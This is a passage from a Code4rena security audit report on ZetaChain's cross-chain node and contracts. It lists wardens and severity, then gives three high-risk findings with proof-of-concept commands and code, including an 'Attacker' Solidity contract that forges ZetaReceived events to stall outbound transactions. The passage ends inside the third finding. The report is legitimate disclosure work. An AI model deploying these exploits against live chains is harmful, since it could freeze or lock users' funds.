---
sponsor: "ZetaChain"
slug: "2023-11-zetachain"
date: "2024-09-06"
title: "ZetaChain"
findings: "https://github.com/code-423n4/2023-11-zetachain-findings/issues"
contest: 304
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the ZetaChain smart contract system written in Solidity. The audit took place between November 20 — December 18, 2023.

## Wardens

32 Wardens contributed reports to the ZetaChain:

  1. [berndartmueller](https://code4rena.com/@berndartmueller)
  2. [ChristiansWhoHack](https://code4rena.com/@ChristiansWhoHack) ([Strikeout](https://code4rena.com/@Strikeout) and [ging3r](https://code4rena.com/@ging3r))
  3. [oakcobalt](https://code4rena.com/@oakcobalt)
  4. [ciphermarco](https://code4rena.com/@ciphermarco)
  5. [MevSec](https://code4rena.com/@MevSec) ([Ethnical](https://code4rena.com/@Ethnical) and [Franfran](https://code4rena.com/@Franfran))
  6. [dontonka](https://code4rena.com/@dontonka)
  7. [p0wd3r](https://code4rena.com/@p0wd3r)
  8. [Al-Qa-qa](https://code4rena.com/@Al-Qa-qa)
  9. [zhaojie](https://code4rena.com/@zhaojie)
  10. [deliriusz](https://code4rena.com/@deliriusz)
  11. [QiuhaoLi](https://code4rena.com/@QiuhaoLi)
  12. [Josephdara\_0xTiwa](https://code4rena.com/@Josephdara_0xTiwa) ([josephdara](https://code4rena.com/@josephdara) and [0xTiwa](https://code4rena.com/@0xTiwa))
  13. [jayjonah8](https://code4rena.com/@jayjonah8)
  14. [kuprum](https://code4rena.com/@kuprum)
  15. [likeTheWind](https://code4rena.com/@likeTheWind)
  16. [csanuragjain](https://code4rena.com/@csanuragjain)
  17. [lsaudit](https://code4rena.com/@lsaudit)
  18. [IllIllI](https://code4rena.com/@IllIllI)
  19. [0x6980](https://code4rena.com/@0x6980)
  20. [PNS](https://code4rena.com/@PNS)
  21. [ChaseTheLight](https://code4rena.com/@ChaseTheLight)
  22. [hihen](https://code4rena.com/@hihen)
  23. [SAQ](https://code4rena.com/@SAQ)
  24. [codeslide](https://code4rena.com/@codeslide)
  25. [Bauchibred](https://code4rena.com/@Bauchibred)
  26. [Kaysoft](https://code4rena.com/@Kaysoft)
  27. [Topmark](https://code4rena.com/@Topmark)
  28. [cartlex\_](https://code4rena.com/@cartlex_)
  29. [Sathish9098](https://code4rena.com/@Sathish9098)

This audit was judged by [0xean](https://code4rena.com/@0xean).

Final report assembled by PaperParachute.

# Summary

The C4 analysis yielded an aggregated total of 48 unique vulnerabilities. Of these vulnerabilities, 14 received a risk rating in the category of HIGH severity and 34 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 20 reports detailing issues with a risk rating of LOW severity or non-critical.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 ZetaChain repository](https://github.com/code-423n4/2023-11-zetachain), and is composed of 31 smart contracts written in the Solidity programming language and includes 1565 lines of Solidity code.

Prior to this competitive audit, 3 teams of Code4rena wardens competed to produce a set of resources to help accelerate wardens’ ability to compete. For more information, see [here](https://github.com/code-423n4/2023-11-zetachain?tab=readme-ov-file#warden-resources-for-zetachain-and-cosmos-sdk-onboarding).

In addition to the known issues identified by the project team, an [Automated Findings report](https://github.com/code-423n4/2023-11-zetachain/blob/main/4naly3er-report.md) was generated using the [4naly3er bot](https://github.com/Picodes/4naly3er) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (14)
## [[H-01] Broken `NonceVoter` Allows Observer to Halt the Chain](https://github.com/code-423n4/2023-11-zetachain-findings/issues/547)
*Submitted by [ciphermarco](https://github.com/code-423n4/2023-11-zetachain-findings/issues/547), also found by [ChristiansWhoHack](https://github.com/code-423n4/2023-11-zetachain-findings/issues/321) and [zhaojie](https://github.com/code-423n4/2023-11-zetachain-findings/issues/216)*

As it is, `NonceVoter` does not count votes or perform any similar operations. A single observer can use it to change chain nonces. Although there is a comment pointing this function is deprecated, it critically influences the system with its broken implementation. Arbitrarily changing nonces for the connected chains can be used to completely break the functioning of the chain and cause loss of funds.

### Proof of Concept

This function is restricted to validator observers (`k.zetaObserverKeeper.IsAuthorized(ctx, msg.Creator, chain)`):

*   <https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_chain_nonces.go#L106C1-L115C3>

```go
func (k msgServer) NonceVoter(goCtx context.Context, msg *types.MsgNonceVoter) (*types.MsgNonceVoterResponse, error) {
	ctx := sdk.UnwrapSDKContext(goCtx)
	chain := k.zetaObserverKeeper.GetParams(ctx).GetChainFromChainID(msg.ChainId)
	if chain == nil {
		return nil, observertypes.ErrSupportedChains
	}

	if ok := k.zetaObserverKeeper.IsAuthorized(ctx, msg.Creator, chain); !ok {
		return nil, observertypes.ErrNotAuthorizedPolicy
	}
	// ... SNIP ...
```

After this check, the entire voting logic is essentially ignored, with a relevant part only drafted and commented, and the chain nonce is simply set:

*   <https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_chain_nonces.go#L145C1-L146C44>

```go
	k.SetChainNonces(ctx, chainNonce)
	return &types.MsgNonceVoterResponse{}, nil
```

This can be easily tested inside one of the hosts in the smoke-tests:

```
# cd into repos/node
$ make start-smoketest
$ docker exec -it zetacore0 bash
# Inside zetacore0
# The operator key may be acquired with the command `zetacored keys list`
$ zetacored tx crosschain nonce-voter 18444 1337 --from ${operator_key} --fees "300azeta"
# Confirm the prompt with "y"
$ zetacored q crosschain list-chain-nonces
# OUTPUT:
ChainNonces:
- chain_id: "18444"
  creator: ""
  finalizedHeight: "57"
  index: btc_regtest
  nonce: "1337" # <--- Chain nonce
  signers:
  - zeta1t4n5yj0u3wjkjwum5exhgh5834gnylgs3apmw5
- chain_id: "1337"
  creator: ""
  finalizedHeight: "57"
  index: goerli_localnet
  nonce: "0"
  signers: []
- chain_id: "101"
  creator: ""
  finalizedHeight: "57"
  index: zeta_mainnet
  nonce: "0"
  signers: []
pagination:
  next_key: null
  total: "0"
```

After the above commands, you can also use the command `zetacored q crosschain list-chain-nonces` inside `zetacored1` to check the `1337` nonce has been set.

### `p.NonceHigh != int64(nonce.Nonce)`

One simple way to halt critical operations of the chain and cause funds to be stuck is to make the function `UpdateNonce` in `cctx_utils.go` fail. Luckily, there is a check that causes this function to fail and return an error, and all we need to do is to change the chain nonce:

*   <https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/cctx_utils.go#L20>

```go
	// #nosec G701 always in range
	if p.NonceHigh != int64(nonce.Nonce) {
		return cosmoserrors.Wrap(types.ErrNonceMismatch, fmt.Sprintf("chain_id %d, high nonce %d, current nonce %d", receiveChainID, p.NonceHigh, nonce.Nonce))
	}
```

All a faulty or compromised observer needs to do is to use `NonceVoter` to desynchronise the nonces for each chain, and this error will be consistently returned by `UpdateNonce` for all chains.

These are critical functions that depend on `UpdateNonce`:

*   [`MigrateTSSFundsForChain`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/msg_migrate_tss_funds.go#L46)
*   [`ProcessCCTX`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_hooks.go#L248)
*   [`VoteOnObservedInboundTx`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L58)
*   [`VoteOnObservedOutboundTx`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L61)
*   [`WhitelistERC20`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/msg_server_whitelist_erc20.go#L24)

Essentially, transactions will be halted and the funds stuck.

### Tools Used

Code Editor, Docker.

### Recommended Mitigation Steps

Implement the correct voting logic or remove this message server's function from the code. In the codebase, it seems there is already another design choice for setting chain nonces that does not depend on this function, so the best mitigation is probably to remove this function altogether.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/547#issuecomment-1883641426)**

***

## [[H-02] Zeta Observer nodes are not listening to `internal TXs`, which makes Smart Contract Wallets users' funds locked when making `Omnichain calls`.](https://github.com/code-423n4/2023-11-zetachain-findings/issues/419)
*Submitted by [Al-Qa-qa](https://github.com/code-423n4/2023-11-zetachain-findings/issues/419), also found by [Al-Qa-qa](https://github.com/code-423n4/2023-11-zetachain-findings/issues/420), [deliriusz](https://github.com/code-423n4/2023-11-zetachain-findings/issues/500), and [likeTheWind](https://github.com/code-423n4/2023-11-zetachain-findings/issues/278)*

### Impact

Zetachain allows omnichain TXs (sending funds from external chains to Zeta EVM chain), using different methods.

*   If it's just sending main blockchain coin funds between addresses: You deposit funds directly to the `TSS_ADDRESS` and it will send money to the destination address as ZRC-20 tokens on Zeta EVM chain.
*   If you are sending ERC20: You need to use `ERC20Custody::deposit()`.

The problem occurs in the first sending method. When the user sends funds (native chain coins) to the `TSS_ADDRESS`.

To define the receiver address you have two things to do:

*   Provide it in the data field of the TX in bytes format (+ any additional message if needed), and Observer nodes take out the rest of the job to decode.
*   Not providing data field in the TX, and in that case, Observers use the caller itself as the receiver address on the Zeta blockchain.

The problem affects Omnichain (Inbound TXs, external EVM => Zeta EVM) which is made by smart contract wallet users.

When smart contract wallets make a sending request, it doesn't make an RPC call. They are making low-level `call` to transfer funds. And here is where the problem occurs.

Observers will not notice this transaction, funds will be sent to the `TSS_ADDRESS` and the Observers will not know that there is an Omnichain call has happened. So user funds will be locked in the `TSS_ADDRESS`.

**Why Smart Contract Wallets are important:**

We should keep in mind that Smart Contract wallets are heavily adopted, and the problem does not affect a small group of users. Mult-sig wallets are increasing, and Account Abstraction is coming, Users will deal with Smart Contract Wallets in the near future instead of EOA.

This is dangerous for users, as most of the users are using their wallets using a UI, and some popular wallets like MetaMask will support account abstraction soon, which will make users' wallets a Smart Contract Wallet as we illustrated before. So users will not be able to interact with ZetaChain and will lose their funds without knowing what is going wrong.

### Proof of Concept

> In our auditing process of the protocol, we made a lot of things (installing deps, making contracts, writing deployments and interact scripts, etc...), So It will be hard for the judger to set up the development environment.
>
> We worked on the second part `protocol-contract`, and used zeta_testnet for our testing purposes.
>
> Here is the Dropbox link to download the `protocol-contract` we worked on, you will find `setup.md` to help you install deps, and run POC scripts easily without any problems.

Downloading link [here](https://www.dropbox.com/scl/fo/b078exeuugkyb72tcs7a0/h?rlkey=mzi4pjja4cbbnyc58yz6e3fns&dl=0).

To not make the POC page too long, we will mention the main points we made to prove the problem. And In the Dropbox folder, everything including (testing script, contracts, etc...) exists with comments and a lot of logs to be easily understood.

After installing the `protocol-contracts` from the Dropbox, you can simply write this command in the console:

    yarn run audit-H1:internal-to-address

What this script does, is what we are going to illustrate below. At first, we made a simple contract that represented a smart contract wallet, sending and receiving coins.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.7;

/// @title Smart Contract Waller
/// @author Code4rena Warden
/// @notice This is not a complete wallet, it is just for demonistrating the vulnerability
contract InternalWallet {
    // to be able to receive ETH
    receive() external payable {}

    // Sending funds to `TSS_ADDRESS` to receive it on zetachain account
    // NOTE: this function should fail, and the funds will be locked in the `TSS_ADDRESS` when sending
    function transferOmnichain(uint256 amount, address tssAddress, bytes memory to) public payable returns (bool) {
        require(amount <= address(this).balance, "InternalWallet: not enough suffiecent");
        (bool success, ) = tssAddress.call{value: amount}(to);
        require(success, "InternalWallet: failed to make Omnichain call");
        return true;
    }

    // Withdraw funds after completeing testing
    function withdraw(address to) public returns (bool) {
        (bool success, ) = to.call{value: address(this).balance}("");
        require(success, "InternalWallet: failed to withdraw funds");
        return true;
    }
}
```

Lastly, we fired `transferOmnichain` with the following parameters:

*   `amount`: 0.1 tMATIC.
*   `tssAddress`: TSS_ADDRESS on mumbai_testnet (0x8531a5aB847ff5B22D855633C25ED1DA3255247e).
*   `to`: Our EOA on ZetaChain (0x0a485F234D49F28b688495d071D164E7dB0cBd9A).

[Image Link](https://res.cloudinary.com/availablecoder/image/upload/v1702549728/code4rena/zetachain/rvkdxj8h8galiwgskmzj.png)

ZetaClient Observers should listen to the transaction, then send ZRC-20 tMATIC to the `to` address. But this did not occur.

This problem happened because ZetaClient Observers handles sending to `TSS_ADDRESS` if it is the `to` parameter of the PRC call, and if the RPC calls contain an internal transactions array, it did not check them.

*   Affected Function: [node/zetaclient/evm_client.go#L774-L993C2](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_client.go#L774-L993C2)
*   Affected line: [node/zetaclient/evm_client.go#L952](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_client.go#L952)

```go
func (ob *EVMChainClient) observeInTX() error {
    ...
    
    //task 1:  Query evm chain for zeta sent logs
    func() { ... }()
    
    // task 2: Query evm chain for deposited logs
    func() { ... }()
    
    // task 3: query the incoming tx to TSS address ==============
    func() {
        tssAddress := ob.Tss.EVMAddress() // after keygen, ob.Tss.pubkey will be updated
        if tssAddress == (ethcommon.Address{}) {
            ob.logger.ExternalChainWatcher.Warn().Msgf("observeInTx: TSS address not set")
            return
        }
    
        // query incoming gas asset
        for bn := startBlock; bn <= toBlock; bn++ {
            ...
    
            for _, tx := range block.Transactions() {
                ...
    
                // Checking for tx.to only not including internal transactions for each transaction
                if *tx.To() == tssAddress { ... }
            }
        }
    }()
...
}
```

Since smart contract wallets can't trigger the transfer directly, all sending from Smart Contract wallets (Multi-sig, Account Abstraction, ...) will fail.

(EOA => Smart Contract Wallet address => TSS_ADDRESS). The `to` will be the contract wallet address, not the `TSS_ADDRESS`.

And since the Observers didn't even listen to the TX (the transaction sent by the smart contract wallet), they will not revert, they will simply do nothing. like there is no one sending money. This will lead to the loss of all funds sent to the `TSS_ADDRESS` from Smart Contract Wallets in external chains when making Omnichain InBound TXs calls.

Here is one of the TXs we made: <br><https://mumbai.polygonscan.com/tx/0x1d919d43b255fd8a2645dfd6159153518b7f1e58798037ea91a1e921b0b7d69d>

We can see that the transaction `to` parameter is the Smart Contract Wallet, So the Observers did not catch this TX.

[Image Link](https://res.cloudinary.com/availablecoder/image/upload/v1702551048/code4rena/zetachain/uyx1f7oua9cycxdcisok.png)

### Tools Used

Hardhat, Polygon Mumbai explorer, and ZetaChain explorer

### Recommended Mitigation Steps

We should track the internal TXs for each RPC transaction. and if the `to` of one of the internal TXs equals the `TSS_ADDRESS` Observers should handle this transaction too (Observers handle it as an InBound Omnichain call).

Although the solution may be simple two things will be challenging when implementing this:

1.  How can we decode data if it is an internal Tx?
2.  Listening to each TX internal TXs may slow down monitoring TXs as the observer nodes will be performing a lot of computation.

### How can we decode data if it is an internal Tx?

In normal TXs to the `TSS_ADDRESS` you are providing the address in the first 20 bytes of the message, and if you want to make external logic on the ZetaChain you are providing them after the address in bytes.

Output message: (20 bytes: receiver address in ZetaChain)(bytes: the message that will be pathed to `conCrossChainCall`).

But In the case of internal TXs things differ, as the function call we fired on our smart contract wallet + message passed in the low-level call to the `TSS_ADDRESS` both exists in the output message.

Here is the output message of the TX I made in testing:
[Image Link](https://res.cloudinary.com/availablecoder/image/upload/v1702555598/code4rena/zetachain/fgvkerspgcgmbo3t2qye.png)

We can write `cast pretty-calldata <OUTPUT_MESSAGE>` to decode the message, and know what it contained.

     Method: 4696616c // transferOmnichain(uint256,address,bytes)
     ------------
     [000]: 000000000000000000000000000000000000000000000000016345785d8a0000 // amount sent 
     [020]: 0000000000000000000000008531a5ab847ff5b22d855633c25ed1da3255247e // tssAddress
     [040]: 0000000000000000000000000000000000000000000000000000000000000060 // The location of the bytes array
     [060]: 0000000000000000000000000000000000000000000000000000000000000014 // bytes array length hex(14) = 20 bytes
     [080]: 0a485f234d49f28b688495d071d164e7db0cbd9a000000000000000000000000 // The bytes array data (receiver address on ZetaChain)

If we go and see how Geth is logging for this transaction, we will find it has an array of `calls` that has one call that represents the internal transaction information.

<https://mumbai.polygonscan.com/vmtrace?txhash=0x1d919d43b255fd8a2645dfd6159153518b7f1e58798037ea91a1e921b0b7d69d&type=gethtrace2#raw>

[Image Link](https://res.cloudinary.com/availablecoder/image/upload/v1702555971/code4rena/zetachain/nn2t6gzbnmgakrcmpvag.png)

So it will be easy for Observer nodes to extract the data sent to the `TSS_ADDRESS` regarding the data that represents overall transaction output data.

### Listening to each TX internal TXs may slow down monitoring TXs as the observer nodes will be performing a lot of computation.

Listening to all transactions, checking for internal transactions for every transaction, and scanning them may cause a lack of network speed (Observers nodes). We are aware of this problem, but we don't exactly know how much performance and speed we will lose when implementing listening to the internal TXs.

The protocol devs are the only one who can determine how much speed the network lose when implementing the internal TXs listening, but In the case of a significant loss in speed, I will mention some things that will help solve the problem if these problems arise after implementing the Mitigation.

1.  The type of the transaction is `CALL`, when we do it directly (RPC), or indirectly (Smart Contract Call). We can only pick the internal TXs that go to the `to` address of type `CALL`.

2.  We can separate the Observers' jobs, instead of Querying the three types of In TXs that should be tracked by each Observe, each Observer node is responsible for tracking one of the following EVM state changes:
    1.  Query evm chain for zeta sent logs
    2.  Query evm chain for deposited logs
    3.  Query the incoming tx to TSS address

So we are separating the work into three, but this may be very hard to implement especially for the `emission` module, how can it distribute rewards?

The last solution may be useless, and unable to be implemented in real. However, I preferred to mention everything that can help in solving the problem of lack of network speed when implementing listening to the internal TXs.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/419#issuecomment-1877391421)**

***

## [[H-03] Fake `ZetaReceived` events cause the outbound cctx to remain pending resulting in a blocked outbound EVM transaction queue](https://github.com/code-423n4/2023-11-zetachain-findings/issues/418)
*Submitted by berndartmueller ([1](https://github.com/code-423n4/2023-11-zetachain-findings/issues/418), [2](https://github.com/code-423n4/2023-11-zetachain-findings/issues/428)) also found by [MevSec](https://github.com/code-423n4/2023-11-zetachain-findings/issues/574), and ChristiansWhoHack ([1](https://github.com/code-423n4/2023-11-zetachain-findings/issues/342), [2](https://github.com/code-423n4/2023-11-zetachain-findings/issues/341), [3](https://github.com/code-423n4/2023-11-zetachain-findings/issues/340), [4](https://github.com/code-423n4/2023-11-zetachain-findings/issues/324))*

Events such as `ZetaReceived` or `ZetaReverted`, supposed to be emitted by the connector contract, can be faked by the receiver contract that is called as part of the [`onReceive`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L64-L66) or [`onRevert`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L90-L99) call.

Worst case, a cctx can be purposefully caused to remain stuck in the `PendingOutbound` state, which blocks the outbound EVM transaction queue and prevents further outbound transactions from being sent.

### Proof of Concept

The observer's EVM client confirms sent outbound transaction within the [`IsSendOutTxProcessed`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L295) function and sends the confirmation (i.e., `MsgVoteOnObservedOutboundTx` vote message) to ZetaChain to ultimately finalize and settle the cctx.

Specifically, outbound cctx's of type `CoinType_Zeta` are processed by checking the emitted events (logs) of the containing transaction. It is expected that either the `ZetaReceived` or `ZetaReverted` event is **emitted by the connector contract**.

However, in line [`386`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L386) (and following), the event's legitimacy is not verified by checking the emitter contract address.

```go
386: 	receivedLog, err := connector.ZetaConnectorNonEthFilterer.ParseZetaReceived(*vLog)
```

Internally, the [`ParseZetaReceived`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/pkg/contracts/evm/zetaconnector.non-eth.sol/zetaconnectornoneth.go#L1587-L1594) function only parses the event and makes sure the event's signature matches the expected one.

```go
func (_ZetaConnectorNonEth *ZetaConnectorNonEthFilterer) ParseZetaReceived(log types.Log) (*ZetaConnectorNonEthZetaReceived, error) {
	event := new(ZetaConnectorNonEthZetaReceived)
	if err := _ZetaConnectorNonEth.contract.UnpackLog(event, "ZetaReceived", log); err != nil {
		return nil, err
	}
	event.Raw = log
	return event, nil
}
```

Thereafter, once the first matching `ZetaReceived` event is found and parsed, the confirmation is sent to ZetaChain, and the [`for`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L376) loop is exited early via the `return` statement in line [`421`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L421). As a result, the other legitimate `ZetaReverted` event, emitted by the connector contract, is ignored.

This fake `ZetaReceived` event can be very harmful to the system if it causes the cctx to not be finalized and stuck in the `PendingOutbound` state.

Concretely, this can be achieved by using the wrong [`internalSendHash`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.base.sol#L51) value in the `ZetaReceived` event, which is used to uniquely identify the cctx. If the `internalSendHash` value does not match the cctx's index and instead, refers to a non-existent cctx, the [`MsgVoteOnObservedOutboundTx` message fails and will never be finalized](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L82-L85).

Such a cctx remains in the pending queue and will be repeatedly [picked up by observers in the `startSendScheduler` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/zetacore_observer.go#L143).

Finally, the impact of this vulnerability shows itself by blocking the outbound transactions due to the `MaxLookaheadNonce` check in [`zetacore_observer.go#L181-L185`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/zetacore_observer.go#L181-L185):

```go
181: const MaxLookaheadNonce = 120
182: if params.OutboundTxTssNonce > cctxList[0].GetCurrentOutTxParam().OutboundTxTssNonce+MaxLookaheadNonce {
183: 	co.logger.ZetaChainWatcher.Error().Msgf("nonce too high: signing %d, earliest pending %d", params.OutboundTxTssNonce, cctxList[0].GetCurrentOutTxParam().OutboundTxTssNonce)
184: 	break
185: }
```

At one point, the stuck cctx will be the first item in the `cctxList` (i.e., `cctxList[0]`), while the next item, at position 1, will have a nonce that is greater than the stuck cctx's nonce plus the `MaxLookaheadNonce` value.

*Basically, this lookahead nonce check acts as a throttle to limit the amount of sent outbound transactions per heartbeat (i.e., per ZetaChain block).*

Subsequently, the `break` statement in line `184` early exits the `for` loop, skipping all other cctx's in the `cctxList` and preventing them from being sent to the external chain.

### PoC

The following simple proof of concept demonstrates sending a cross-chain message and faking the `ZetaReceived` event to cause the cctx to remain pending.

1.  Spin up the smoke tests for a local test environment via `make start-smoketest`.

2.  Setup Remix (or similar), Metamask (or similar) with the local ETH network and the **deployer** account (which has already sufficient Zeta tokens)
    *   Private key: `d87baf7bf6dc560a252596678c12e41f7d1682837f05b29d411bc3f78ae2c263`
    *   Address: `0xE5C5367B8224807Ac2207d350E60e1b6F27a7ecC`

3.  Deploy the following `Attacker` Solidity contract to the local ETH network:

<details>

    ```solidity
    // SPDX-License-Identifier: GPL-3.0

    pragma solidity ^0.8.0;

    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

    interface ZetaInterfaces {
        /**
        * @dev Use SendInput to interact with the Connector: connector.send(SendInput)
        */
        struct SendInput {
            /// @dev Chain id of the destination chain. More about chain ids https://docs.zetachain.com/learn/glossary#chain-id
            uint256 destinationChainId;
            /// @dev Address receiving the message on the destination chain (expressed in bytes since it can be non-EVM)
            bytes destinationAddress;
            /// @dev Gas limit for the destination chain's transaction
            uint256 destinationGasLimit;
            /// @dev An encoded, arbitrary message to be parsed by the destination contract
            bytes message;
            /// @dev ZETA to be sent cross-chain + ZetaChain gas fees + destination chain gas fees (expressed in ZETA)
            uint256 zetaValueAndGas;
            /// @dev Optional parameters for the ZetaChain protocol
            bytes zetaParams;
        }

        /**
        * @dev Our Connector calls onZetaMessage with this struct as argument
        */
        struct ZetaMessage {
            bytes zetaTxSenderAddress;
            uint256 sourceChainId;
            address destinationAddress;
            /// @dev Remaining ZETA from zetaValueAndGas after subtracting ZetaChain gas fees and destination gas fees
            uint256 zetaValue;
            bytes message;
        }

        /**
        * @dev Our Connector calls onZetaRevert with this struct as argument
        */
        struct ZetaRevert {
            address zetaTxSenderAddress;
            uint256 sourceChainId;
            bytes destinationAddress;
            uint256 destinationChainId;
            /// @dev Equals to: zetaValueAndGas - ZetaChain gas fees - destination chain gas fees - source chain revert tx gas fees
            uint256 remainingZetaValue;
            bytes message;
        }
    }

    interface ZetaConnector {
        function send(ZetaInterfaces.SendInput calldata input) external;
    }

    interface ZetaReceiver {
        function onZetaMessage(ZetaInterfaces.ZetaMessage calldata zetaMessage) external;
        function onZetaRevert(ZetaInterfaces.ZetaRevert calldata zetaRevert) external;
    }

    contract Attacker is ZetaReceiver {
        event ZetaReceived(
            bytes zetaTxSenderAddress,
            uint256 indexed sourceChainId,
            address indexed destinationAddress,
            uint256 zetaValue,
            bytes message,
            bytes32 indexed internalSendHash
        );

        ZetaConnector public connector = ZetaConnector(0x733aB8b06DDDEf27Eaa72294B0d7c9cEF7f12db9);
        IERC20 public zeta = IERC20(0xA8D5060feb6B456e886F023709A2795373691E63);

        function start(uint256 amount, uint256 gasLimit) public {
            ZetaInterfaces.SendInput memory input = ZetaInterfaces.SendInput(
                1337,
                abi.encodePacked(address(this)),
                gasLimit,
                abi.encodePacked("42"),
                amount,
                ""
            );

            zeta.transferFrom(msg.sender, address(this), amount);
            zeta.approve(address(connector), amount);

            connector.send(input);
        }

        function onZetaMessage(ZetaInterfaces.ZetaMessage calldata zetaMessage) external {
            bytes memory zetaTxSenderAddress = zetaMessage.zetaTxSenderAddress;
            uint256 sourceChainId = zetaMessage.sourceChainId;
            address destinationAddress = zetaMessage.destinationAddress;
            uint256 zetaValue = zetaMessage.zetaValue + 1;
            bytes memory message = zetaMessage.message;
            bytes32 internalSendHash = bytes32(abi.encodePacked("42")); // @audit-info Non-existent cctx index

            emit ZetaReceived(zetaTxSenderAddress, sourceChainId, destinationAddress, zetaValue, message, internalSendHash);
        }

        function onZetaRevert(ZetaInterfaces.ZetaRevert calldata zetaRevert) external {}
    }
    ```

</details>

4.  Approve the `Attacker` contract as the Zeta token spender for the **deployer** (`0xE5C5367B8224807Ac2207d350E60e1b6F27a7ecC`) address. Unlimited allowance is recommended for simplicity.

5.  With the **deployer** account, call the `start` function on the `Attacker` contract with the following parameters:

    *   `amount`: `3133700000000000000` (i.e., `3.1337e18`)
    *   `gasLimit`: `200000`

    This function initiates a cross-chain message, however, for simplicity the cross-chain message is sent to the same chain as it originates, i.e., the local ETH network with the chain id `1337`. The `Attacker` contract is the receiver and will emit a fake `ZetaReceived` event ([imitating the `ZetaConnectorEth.onReceive` function's event](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L69)). However, this fake `ZetaReceived` event has the wrong `internalSendHash` value, which is used to identify the cross-chain cctx. As a result, [voting for the outbound cctx will fail](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L82-L85) and the cctx remains pending.

6.  The current cctx's status can be queried by accessing the `zetacore0` docker container and using the `list-cctx` command:

    ```
    docker exec -it zetacore0 sh
    zetacored q crosschain list-cctx
    ```

    Checking the output shows that the status of the cctx remains pending (`PendingOutbound`), even though it has been successfully sent to the receiver chain:

    ```
    ...snip...
    - cctx_status:
        lastUpdate_timestamp: "1702830340"
        status: PendingOutbound
        status_message: ""
      creator: zeta17q8u7exkgcacjvv934vrmdc79fgfxk2p8z577u
      inbound_tx_params:
        amount: "3133700000000000000"
        asset: ""
        coin_type: Zeta
        inbound_tx_ballot_index: 0xcff6c96cd6701b770ce653189c4e769a3d9d891780a2e135ef641b386174a1bd
        inbound_tx_finalized_zeta_height: "2270"
        inbound_tx_observed_external_height: "2678"
        inbound_tx_observed_hash: 0x1195c0861c9fc05464ccf5630ded9b03a28bccc28e8b341a351fc1469c482fba
        sender: 0xa825eAa55b497AF892faca73a3797046C10B7c23
        sender_chain_id: "1337"
        tx_origin: 0xE5C5367B8224807Ac2207d350E60e1b6F27a7ecC
      index: 0xcff6c96cd6701b770ce653189c4e769a3d9d891780a2e135ef641b386174a1bd
      ...snip...
    ```

